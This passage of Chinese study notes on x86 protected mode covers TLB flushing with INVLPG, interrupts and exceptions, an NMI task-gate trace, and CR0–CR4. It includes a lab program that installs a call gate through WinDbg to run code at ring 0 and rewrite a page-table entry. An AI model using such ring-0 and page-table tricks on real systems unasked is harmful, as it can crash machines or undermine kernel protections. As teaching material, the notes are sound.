<h3 id="1-4-练习：INVLPG清空某线性地址的TLB"><a href="#1-4-练习：INVLPG清空某线性地址的TLB" class="headerlink" title="1.4 练习：INVLPG清空某线性地址的TLB"></a>1.4 练习：INVLPG清空某线性地址的TLB</h3><p>NULL的PTE_G &#x3D; 1，使用指令<code>INVLPG dword ptr ds:[0]</code>会清空NULL在TLB的纪录，下一次读内存时将会重新解析线性地址并缓存至TLB，<strong>不会</strong>存在“误差”。指令INVLPG强行删除某项全局页缓存或非全局页的缓存。</p>
<div class="note danger"><p><strong>结论：</strong>PTE的G位为0的情况下，凡是涉及修改PTE，要想使修改后的值立即生效，必须使用INVLPG指令，否则由于存在TLB的缘故，修改PTE后第一次再读原地址的值会从TLB中取。</p>
</div>

<p><code>INVLPG dword ptr ds:[0]</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234967</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		mov eax,cr3</span><br><span class="line">		mov cr3,eax</span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		INVLPG dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/8EBbhAJGO73RUDL.png" alt="43.png"></p>
<h2 id="2-中断和异常"><a href="#2-中断和异常" class="headerlink" title="2 中断和异常"></a>2 中断和异常</h2><h3 id="2-1-中断"><a href="#2-1-中断" class="headerlink" title="2.1 中断"></a>2.1 中断</h3><p>中断通常是由CPU<strong>外部的输入输出设备（硬件）</strong>所触发的，供外部设备通知，CPU“有事情需要处理”，因此又叫中断请求（Interrupt Request）。</p>
<p>中断请求的目的是希望CPU暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程（中断处理程序在哪有<mark class="label default">IDT</mark>表决定）</p>
<p>80×86有两条中断请求线：</p>
<ul>
<li>非屏蔽中断线，称为NMI（NonMaskable Interrupt）</li>
<li>可屏蔽中断线，称为INTR（Interrupt Require）</li>
</ul>
<p><strong>⚠️注意：</strong></p>
<ol>
<li>中断的本质：改变CPU执行的路线。</li>
<li>操作系统并没有使用时钟进行线程切换，时钟只是线程切换的一个条件。</li>
</ol>
<p><strong>一、非可屏蔽中断</strong></p>
<p>特别说明：</p>
<ul>
<li>当非可屏蔽中断产生时，CPU在执行完当前指令后会立即进入中断处理程序。</li>
<li><strong>非可屏蔽中断不受EFLAG寄存器中IF位的影响</strong>，一旦发生，CPU必须处理。</li>
<li>非可屏蔽中断处理程序位于<strong>IDT表中的2号</strong>（0x2）位置。</li>
</ul>
<p><strong>二、可屏蔽中断</strong></p>
<p>在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求。为了便于标识各个中断请求，中断管理器通常用IRQ（Interrupt Request）后面加上数字来表示不同的中断。</p>
<p>比如：在Windows中 时钟中断的IRQ编号为0  也就是：IRQ0。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/Y5aFfkC4LySpe2O.png" alt="44.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/09/cztPHwlxdXrjVFi.png" alt="45.png"></p>
<div class="note primary"><p>特别说明：</p>
<ol>
<li><p>如果自己的程序执行时不希望CPU去处理这些中断，可以用CLI指令清空EFLAG寄存器中的IF位，IF &#x3D; 0。（STI指令可使IF &#x3D; 1）</p>
</li>
<li><p>硬件中断与IDT表中的对应关系并非固定不变的，参见：APIC（高级可编程中断控制器）。</p>
</li>
<li><p>大多数操作系统时钟中断在10-100ms之间，Windows系列为10-20ms。</p>
</li>
</ol>
</div>

<h3 id="2-2-异常"><a href="#2-2-异常" class="headerlink" title="2.2 异常"></a>2.2 异常</h3><p>异常通常是CPU在执行指令时检测到的某些错误，比如除0、访问无效页面等。</p>
<div class="note info"><p>中断与异常的区别：<br>1、中断来自于外部设备，是中断源（比如键盘）发起的，<strong>CPU是被动的</strong>。<br>2、异常来自于CPU本身，是<strong>CPU主动产生</strong>的。<br>3、<code>INT N</code>虽然被称为“软件中断”，<strong>但其本质是异常</strong>。<mark class="label warning">EFLAG的IF位对INT N无效</mark>。</p>
</div>

<div class="note success"><p>⚠️<strong>注意：</strong>无论是由硬件设备触发的中断请求还是由CPU产生的异常，处理程序都在IDT表。</p>
</div>

<p>常见的异常处理程序：</p>
<p><img data-src="https://s2.loli.net/2022/01/09/upqzB8NP3DUlykt.png" alt="46.png"></p>
<p>比如<strong>缺页异常</strong>，CPU会执行IDT表中的0xE号中断处理程序，由操作系统来接管。</p>
<p>缺页异常的产生：</p>
<p>1、当PDE&#x2F;PTE的P&#x3D;0时。</p>
<p>2、当PDE&#x2F;PTE的属性为只读但程序试图写入时。</p>
<p>3、当物理内存空间不足时，线性地址对应的物理页将被存储到文件中。</p>
<p>如下图左，产生缺页异常时，如果PTE下标0、10、11位为0，其余位为1，则会从文件中重新写回一个物理页。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/Q1nYBfJjlItROpg.png" alt="47.png"></p>
<p>有效位（下标9、10、11），在发生缺页时（<strong>PTE的P&#x3D;0</strong>）使用。分以下四种情况（具体可见内存管理-无处不在的缺页异常）。关于这部分知识，等以后学习了内存管理的缺页异常就知道了，这里简单介绍一下。</p>
<p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/01/JLsmQIGSwDN4YlA.png" alt="22.png"></p>
<p>int N中断号对应信息如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/19/BcpDH8f6i1whAxo.png" alt="59.png"></p>
<h3 id="1-3-分析IDT表中0x2号中断的执行流程"><a href="#1-3-分析IDT表中0x2号中断的执行流程" class="headerlink" title="1.3 分析IDT表中0x2号中断的执行流程"></a>1.3 分析IDT表中0x2号中断的执行流程</h3><p>调用门、任务门、中断门、陷进门段描述符如下（GDT中无调用门描述符，IDT中无中断门描述符，但是我们可以构造）：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/XG2MfN1EWKw965T.png" alt="29调用门描述符.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/RNkserCWtXMZF5D.png" alt="55.png"></p>
<p>可以看到低4字节中的高16位，除任务门中为任务段外都为段选择子，用于查GDT表。</p>
<ol>
<li><p>查IDT表。0x2号中断，查idt表下标2，即第三个。</p>
<ul>
<li><p>P &#x3D; 1，S &#x3D; 0。</p>
</li>
<li><p>Type &#x3D; 0x5 &#x3D; 0101，对应<strong>任务门</strong>。<a href="#type">（Type域查表）</a></p>
</li>
<li><p>段选择子：0x0058。</p>
</li>
<li><p>偏移Offset：任务门描述符不存在偏移，而非0x0000113e。</p>
</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/01/09/xkNt3nQAeifqhTJ.png" alt="48.png"></p>
</li>
<li><p>查IDT表。段选择子0x0058–0101 1000– 1011 0 00 &#x3D; 11，即第12个。<a href="#Seg_Selector">（段选择子结构查表）</a></p>
<p><img data-src="https://s2.loli.net/2022/01/09/D1C6X7NyakSuxR8.png" alt="49.png"></p>
<ul>
<li>P &#x3D; 1，S &#x3D; 0。</li>
<li>Type &#x3D; 0x9，对应<strong>32位的任务段</strong>。<a href="#TSS">（32位TSS段描述符）</a></li>
</ul>
</li>
<li><p>从TSS段描述符中获取Base，然后获取EIP的值TSS[8]即第9个。</p>
<ul>
<li>TSS.Base &#x3D; 0x80552768</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/01/09/XQkrMHul5yzpsU4.png" alt="50.png"></p>
</li>
<li><p>得到EIP &#x3D; 0x8054340c，则0x2号中断应该执行的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; uf <span class="number">8054340</span>c</span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x560</span>:</span><br><span class="line"><span class="number">8054340</span>c fa              cli		<span class="comment">//if = 0,屏蔽中断。sti--if = 1</span></span><br><span class="line"><span class="number">8054340</span>d <span class="number">64f</span>f3540000000  push    dword ptr fs:[<span class="number">40</span>h]<span class="comment">//fs.base + 0x40</span></span><br><span class="line"><span class="number">80543414</span> <span class="number">64</span>a13c000000    mov     eax,dword ptr fs:[<span class="number">0000003</span>Ch]</span><br><span class="line"><span class="number">8054341</span>a <span class="number">8</span>a685f          mov     ch,byte ptr [eax+<span class="number">5F</span>h]</span><br><span class="line"><span class="number">8054341</span>d <span class="number">8</span>a485c          mov     cl,byte ptr [eax+<span class="number">5</span>Ch]</span><br><span class="line"><span class="number">80543420</span> c1e110          shl     ecx,<span class="number">10</span>h</span><br><span class="line"><span class="number">80543423</span> <span class="number">668b</span>485a        mov     cx,word ptr [eax+<span class="number">5</span>Ah]</span><br><span class="line"><span class="number">80543427</span> <span class="number">64890</span>d40000000  mov     dword ptr fs:[<span class="number">40</span>h],ecx</span><br><span class="line"><span class="number">8054342</span>e <span class="number">9</span>c              pushfd</span><br><span class="line"><span class="number">8054342f</span> <span class="number">812424f</span>fbfffff  <span class="keyword">and</span>     dword ptr [esp],<span class="number">0F</span>FFFBFFFh</span><br><span class="line"><span class="number">80543436</span> <span class="number">9</span>d              popfd</span><br><span class="line"><span class="number">80543437</span> <span class="number">648b</span>0d3c000000  mov     ecx,dword ptr fs:[<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">8054343</span>e <span class="number">8</span>d4158          lea     eax,[ecx+<span class="number">58</span>h]</span><br><span class="line"><span class="number">80543441</span> c6400589        mov     byte ptr [eax+<span class="number">5</span>],<span class="number">89</span>h</span><br><span class="line"><span class="number">80543445</span> <span class="number">8b</span>0424          mov     eax,dword ptr [esp]</span><br><span class="line"><span class="number">80543448</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054344</span>a <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054344</span>c <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054344</span>e <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543450</span> ff7050          push    dword ptr [eax+<span class="number">50</span>h]</span><br><span class="line"><span class="number">80543453</span> ff7038          push    dword ptr [eax+<span class="number">38</span>h]</span><br><span class="line"><span class="number">80543456</span> ff7024          push    dword ptr [eax+<span class="number">24</span>h]</span><br><span class="line"><span class="number">80543459</span> ff704c          push    dword ptr [eax+<span class="number">4</span>Ch]</span><br><span class="line"><span class="number">8054345</span>c ff7020          push    dword ptr [eax+<span class="number">20</span>h]</span><br><span class="line"><span class="number">8054345f</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543461</span> ff703c          push    dword ptr [eax+<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">80543464</span> ff7034          push    dword ptr [eax+<span class="number">34</span>h]</span><br><span class="line"><span class="number">80543467</span> ff7040          push    dword ptr [eax+<span class="number">40</span>h]</span><br><span class="line"><span class="number">8054346</span>a ff7044          push    dword ptr [eax+<span class="number">44</span>h]</span><br><span class="line"><span class="number">8054346</span>d ff7058          push    dword ptr [eax+<span class="number">58</span>h]</span><br><span class="line"><span class="number">80543470</span> <span class="number">64f</span>f3500000000  push    dword ptr fs:[<span class="number">0</span>]</span><br><span class="line"><span class="number">80543477</span> <span class="number">6</span>aff            push    <span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">80543479</span> ff7028          push    dword ptr [eax+<span class="number">28</span>h]</span><br><span class="line"><span class="number">8054347</span>c ff702c          push    dword ptr [eax+<span class="number">2</span>Ch]</span><br><span class="line"><span class="number">8054347f</span> ff7030          push    dword ptr [eax+<span class="number">30</span>h]</span><br><span class="line"><span class="number">80543482</span> ff7054          push    dword ptr [eax+<span class="number">54</span>h]</span><br><span class="line"><span class="number">80543485</span> ff7048          push    dword ptr [eax+<span class="number">48</span>h]</span><br><span class="line"><span class="number">80543488</span> ff705c          push    dword ptr [eax+<span class="number">5</span>Ch]</span><br><span class="line"><span class="number">8054348b</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054348</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054348f</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543491</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543493</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543495</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543497</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543499</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054349b</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054349</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054349f</span> ff7020          push    dword ptr [eax+<span class="number">20</span>h]</span><br><span class="line"><span class="number">805434</span>a2 ff703c          push    dword ptr [eax+<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">805434</span>a5 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">805434</span>a7 <span class="number">33</span>db            <span class="keyword">xor</span>     ebx,ebx</span><br><span class="line"><span class="number">805434</span>a9 <span class="number">648</span>a1d51000000  mov     bl,byte ptr fs:[<span class="number">51</span>h]</span><br><span class="line"><span class="number">805434b</span>0 <span class="number">391</span>ddc275580    cmp     dword ptr [nt!NtBuildNumber+<span class="number">0x46f4</span> (<span class="number">805527</span>dc)],ebx</span><br><span class="line"><span class="number">805434b</span>6 <span class="number">7414</span>            je      nt!Kei386EoiHelper+<span class="number">0x620</span> (<span class="number">805434</span>cc)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x60c</span>:</span><br><span class="line"><span class="number">805434b</span>8 <span class="number">8</span>d05d8275580    lea     eax,[nt!NtBuildNumber+<span class="number">0x46f0</span> (<span class="number">805527</span>d8)]</span><br><span class="line"><span class="number">805434b</span>e <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">805434b</span>f <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">805434</span>c1 <span class="number">8b</span>cc            mov     ecx,esp</span><br><span class="line"><span class="number">805434</span>c3 <span class="number">8b</span>d5            mov     edx,ebp</span><br><span class="line"><span class="number">805434</span>c5 e83acbfbff      call    nt!KeRestoreFloatingPointState+<span class="number">0x21a</span> (<span class="number">80500004</span>)</span><br><span class="line"><span class="number">805434</span>ca eb24            jmp     nt!Kei386EoiHelper+<span class="number">0x644</span> (<span class="number">805434f</span>0)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x620</span>:</span><br><span class="line"><span class="number">805434</span>cc <span class="number">833</span>de027558008  cmp     dword ptr [nt!NtBuildNumber+<span class="number">0x46f8</span> (<span class="number">805527e0</span>)],<span class="number">8</span></span><br><span class="line"><span class="number">805434</span>d3 <span class="number">721b</span>            jb      nt!Kei386EoiHelper+<span class="number">0x644</span> (<span class="number">805434f</span>0)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x629</span>:</span><br><span class="line"><span class="number">805434</span>d5 <span class="number">7517</span>            jne     nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x62b</span>:</span><br><span class="line"><span class="number">805434</span>d7 <span class="number">803</span>d406a558000  cmp     byte ptr [nt!KdDebuggerNotPresent (<span class="number">80556</span>a40)],<span class="number">0</span></span><br><span class="line"><span class="number">805434</span>de <span class="number">750</span>e            jne     nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x634</span>:</span><br><span class="line"><span class="number">805434e0</span> <span class="number">803</span>d416a558000  cmp     byte ptr [nt!KdDebuggerEnabled (<span class="number">80556</span>a41)],<span class="number">0</span></span><br><span class="line"><span class="number">805434e7</span> <span class="number">7405</span>            je      nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x63d</span>:</span><br><span class="line"><span class="number">805434e9</span> e8566bfbff      call    nt!KeEnterKernelDebugger (<span class="number">804f</span>a044)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x642</span>:</span><br><span class="line"><span class="number">805434</span>ee ebfe            jmp     nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x644</span>:</span><br><span class="line"><span class="number">805434f</span>0 <span class="number">891</span>ddc275580    mov     dword ptr [nt!NtBuildNumber+<span class="number">0x46f4</span> (<span class="number">805527</span>dc)],ebx</span><br><span class="line"><span class="number">805434f</span>6 ff05e0275580    inc     dword ptr [nt!NtBuildNumber+<span class="number">0x46f8</span> (<span class="number">805527e0</span>)]</span><br><span class="line"><span class="number">805434f</span>c <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">805434f</span>e ff158c904d80    call    dword ptr [nt+<span class="number">0x108c</span> (<span class="number">804</span>d908c)]</span><br><span class="line"><span class="number">80543504</span> ff0de0275580    dec     dword ptr [nt!NtBuildNumber+<span class="number">0x46f8</span> (<span class="number">805527e0</span>)]</span><br><span class="line"><span class="number">8054350</span>a <span class="number">754</span>a            jne     nt!Kei386EoiHelper+<span class="number">0x6aa</span> (<span class="number">80543556</span>)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x660</span>:</span><br><span class="line"><span class="number">8054350</span>c c705dc275580ffffffff mov dword ptr [nt!NtBuildNumber+<span class="number">0x46f4</span> (<span class="number">805527</span>dc)],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">80543516</span> <span class="number">8b</span>cc            mov     ecx,esp</span><br><span class="line"><span class="number">80543518</span> e88fe5ffff      call    nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+<span class="number">0x4</span> (<span class="number">80541</span>aac)</span><br><span class="line"><span class="number">8054351</span>d <span class="number">83</span>c408          add     esp,<span class="number">8</span></span><br><span class="line"><span class="number">80543520</span> <span class="number">64</span>a140000000    mov     eax,dword ptr fs:[<span class="number">00000040</span>h]</span><br><span class="line"><span class="number">80543526</span> <span class="number">66833858</span>        cmp     word ptr [eax],<span class="number">58</span>h</span><br><span class="line"><span class="number">8054352</span>a <span class="number">742</span>a            je      nt!Kei386EoiHelper+<span class="number">0x6aa</span> (<span class="number">80543556</span>)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x680</span>:</span><br><span class="line"><span class="number">8054352</span>c <span class="number">81</span>c48c000000    add     esp,<span class="number">8</span>Ch</span><br><span class="line"><span class="number">80543532</span> <span class="number">648f</span>0540000000  pop     dword ptr fs:[<span class="number">40</span>h]</span><br><span class="line"><span class="number">80543539</span> <span class="number">648b</span>0d3c000000  mov     ecx,dword ptr fs:[<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">80543540</span> <span class="number">8</span>d4128          lea     eax,[ecx+<span class="number">28</span>h]</span><br><span class="line"><span class="number">80543543</span> c640058b        mov     byte ptr [eax+<span class="number">5</span>],<span class="number">8B</span>h</span><br><span class="line"><span class="number">80543547</span> <span class="number">9</span>c              pushfd</span><br><span class="line"><span class="number">80543548</span> <span class="number">810</span>c2400400000  <span class="keyword">or</span>      dword ptr [esp],<span class="number">4000</span>h</span><br><span class="line"><span class="number">8054354f</span> <span class="number">9</span>d              popfd</span><br><span class="line"><span class="number">80543550</span> cf              iretd</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x6aa</span>:</span><br><span class="line"><span class="number">80543556</span> b802000000      mov     eax,<span class="number">2</span></span><br><span class="line"><span class="number">8054355b</span> e9fc280000      jmp     nt!KiCoprocessorError+<span class="number">0xe4</span> (<span class="number">80545e5</span>c)</span><br><span class="line"></span><br><span class="line">nt!KiCoprocessorError+<span class="number">0xe4</span>:</span><br><span class="line"><span class="number">80545e5</span>c <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">80545e5</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80545e5</span>f <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80545e61</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80545e63</span> <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">80545e64</span> <span class="number">6</span>a7f            push    <span class="number">7F</span>h</span><br><span class="line"><span class="number">80545e66</span> e80546fbff      call    nt!KeRegisterBugCheckReasonCallback+<span class="number">0x208</span> (<span class="number">804f</span>a470)</span><br><span class="line"><span class="number">80545e6</span>b c3              ret</span><br></pre></td></tr></table></figure></li>
</ol>
<p><span id="type"><strong>Type域查表：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/15/XDhxQR5jtH7GL4s.png" alt="13.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/15/iPe4ZLHvujJ1pEt.png" alt="15.png"></p>
</span>

<p><span id="Seg_Selector"><strong>段选择子结构：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/14/hjy1X9lCY3OULfi.png" alt="5.png"></p>
</span>

<p><span id="TSS"><strong>32位TSS段描述符：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
</span>

<h2 id="3-控制寄存器"><a href="#3-控制寄存器" class="headerlink" title="3 控制寄存器"></a>3 控制寄存器</h2><p>控制寄存器用于控制和确定<strong>CPU的操作模式</strong>。</p>
<p>CR0、CR1、CR2、CR3、CR4：</p>
<ul>
<li>CR1：保留。</li>
<li>CR2：缺页线性地址。</li>
<li>CR3：页目录表基址。</li>
</ul>
<h3 id="3-1-CR0"><a href="#3-1-CR0" class="headerlink" title="3.1 CR0"></a>3.1 CR0</h3><p><img data-src="https://s2.loli.net/2022/01/09/QMc5JnSfsUotb3B.png" alt="51.png"></p>
<p>说明：</p>
<ol>
<li>PE位：为CR0的位0，是启用保护（Protection Enable）标志。<strong>这个标志仅开启段级保护，而并没有启用分页机制</strong>。<ul>
<li>PE &#x3D; 1，保护模式。</li>
<li>PE &#x3D; 0。实地址模式。</li>
</ul>
</li>
</ol>
<p>若要启用分页机制，那么PE和PG标志都要置位。</p>
<ol start="2">
<li>PG位：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或者同时开启PE标志。<ul>
<li>PG &#x3D; 0 且PE &#x3D; 0 ，处理器工作在<strong>实地址模式</strong>下。</li>
<li>PG &#x3D; 0且PE &#x3D; 1，处理器工作在<strong>没有开启分页机制的保护模式下</strong>（目前没有这样的操作系统）。</li>
<li>PG &#x3D; 1且PE &#x3D; 0 ，在PE没有开启的情况下，无法开启PG。（没有这样的状态）</li>
<li>PG &#x3D; 1且PE &#x3D; 1，<strong>处理器工作在开启了分页机制的保护模式下</strong>。</li>
</ul>
</li>
<li>WP位：对于Intel 80486或以上的CPU，CR0的位16是写保护（Write Proctect）标志。当设置该标志时，处理器会<strong>禁止超级用户程序</strong>（例如特权级0的程序）<strong>向用户级只读页面执行写操作</strong>。<br>当CPL&lt;3的时候：<ul>
<li>WP &#x3D; 0，可以读写任意用户级物理页，只要线性地址有效。 </li>
<li>WP &#x3D; 1，可以读取任意用户级物理页，但对于只读的物理页，<strong>则不能写</strong>。</li>
</ul>
</li>
</ol>
<h3 id="3-2-CR2"><a href="#3-2-CR2" class="headerlink" title="3.2 CR2"></a>3.2 CR2</h3><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常<br>的线性地址存放在CR2中。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/JT9DUwGHCzEKnZg.png" alt="52.png"></p>
<h3 id="3-3-CR3"><a href="#3-3-CR3" class="headerlink" title="3.3 CR3"></a>3.3 CR3</h3><p>CR3一包含了页目录的基地址和二个标志（PCD和PWT）。该寄存器也被称为页目录基地址寄存器（PDBR）。页目录基地址只有高20位确定，低12位是0，<strong>所以页目录地址必须是页边界对齐的</strong>（4K字节）。</p>
<p>对齐的（4K字节）。PCD和PWT标志控制着页目录在处理器内部数据缓冲区的缓存（它们不控制TLB页目录信息的缓存）。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/LP7hAXtRxT3Zrs8.png" alt="55.png"></p>
<h3 id="3-4-CR4"><a href="#3-4-CR4" class="headerlink" title="3.4 CR4"></a>3.4 CR4</h3><p>CR4包含了一组标志，这些标志启用了架构方面的几个扩展，并指明了系统对某些处理器支持的能力。。在保护模式下，MOV指令允许读取或者装载控制寄存器（在0级特权下）。这个限制意味着应用程序或者操作系统过程（运行在1、2、3级特权下）不能读取或者装载控制寄存器。装载控制寄存器时，保留位应该保持以前读取的值。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/sb4X6wqZujIEAQk.png" alt="53.png"></p>
<p>PAE&#x2F;PSE说明：</p>
<ul>
<li>PAE &#x3D; 1，是2-9-9-12分页。</li>
<li>PAE &#x3D; 0，是10-10-12分页。</li>
</ul>
<p>应特别注意，PDE的PS位受CR4的PSE位影响，具体如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/09/Dw7epWShPrCFKXg.png" alt="54.png"></p>
<h2 id="4-PCD和PWT标志位"><a href="#4-PCD和PWT标志位" class="headerlink" title="4 PCD和PWT标志位"></a>4 PCD和PWT标志位</h2><p>PCD和PWT标志存在于PDBR(CR3)、PDPE、PDE、PTE中，分别如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/09/LP7hAXtRxT3Zrs8.png" alt="55.png"></p>
<p>10-10-12分页PDE、PTE：</p>
<p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>2-9-9-12分页PDPE：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/l6JxzEvBt4Q9Kpa.png" alt="26.png"></p>
<p>PDE：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/ORKa3UlpH4bzMGy.png" alt="27.png"></p>
<p>PTE：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/OxFfnzJ3oUtXakI.png" alt="29.png"></p>
<p>1、CPU缓存</p>
<p>1）CPU缓存是位于CPU与物理内存之间的临时存储器，它的容量比内存小的多但是交换速度却比内存要快得多。</p>
<p>2）CPU缓存可以做的很大，有几K、几十K、几百K 甚至上M的也有。</p>
<p>CPU缓存与TLB的区别：</p>
<p>TLB：</p>
